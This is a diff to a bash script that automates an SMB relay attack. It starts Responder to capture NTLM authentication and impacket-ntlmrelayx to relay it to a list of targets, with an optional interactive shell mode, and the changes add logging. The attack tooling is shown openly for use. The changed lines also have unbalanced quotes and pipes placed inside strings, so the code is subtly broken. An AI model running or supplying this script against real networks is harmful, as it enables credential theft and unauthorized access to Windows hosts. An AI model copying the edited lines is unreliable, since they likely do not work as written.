@@ -121,7 +121,7 @@ start_tmux_window() {
 
 # Function to execute SMB relay attack in tmux
 run_smb_relay_attack() {
-    echo -e "${BLUE}[*] Starting SMB Relay Attack...${RESET}"
+    echo -e "${BLUE}[*] Starting SMB Relay Attack...${RESET}" | tee -a attack.log
 
     # Ensure tmux session exists
     if ! tmux has-session -t "$session_name" 2>/dev/null; then
@@ -131,7 +131,7 @@ run_smb_relay_attack() {
 
     # Start Responder in a tmux window
     echo -e "${CYAN}Starting Responder on interface $network_interface...${RESET}"
-    start_tmux_window "$session_name" "responder" "responder -I $network_interface" || {
+    start_tmux_window "$session_name" "responder" "responder -I $network_interface" 2>&1 | tee -a responder_$(date +%s).log" || {
         echo -e "${RED}Failed to start Responder.${RESET}"
         exit 1
     }
@@ -139,7 +139,7 @@ run_smb_relay_attack() {
     # Start ntlmrelayx in another tmux window
     echo -e "${CYAN}Starting impacket-ntlmrelayx with target file ${TARGET_SMB_FILE}...${RESET}"
 
-    relay_command="impacket-ntlmrelayx -smb2support -tf ${TARGET_SMB_FILE}"
+    relay_command="impacket-ntlmrelayx -smb2support -tf ${TARGET_SMB_FILE}" 2>&1 | tee -a relay_$(date +%s).log"
     if [ "$enable_interactive" = true ]; then
         echo -e "${YELLOW}[+] Enabling interactive shell (--interactive) in ntlmrelayx.${RESET}"
         relay_command+=" --interactive"
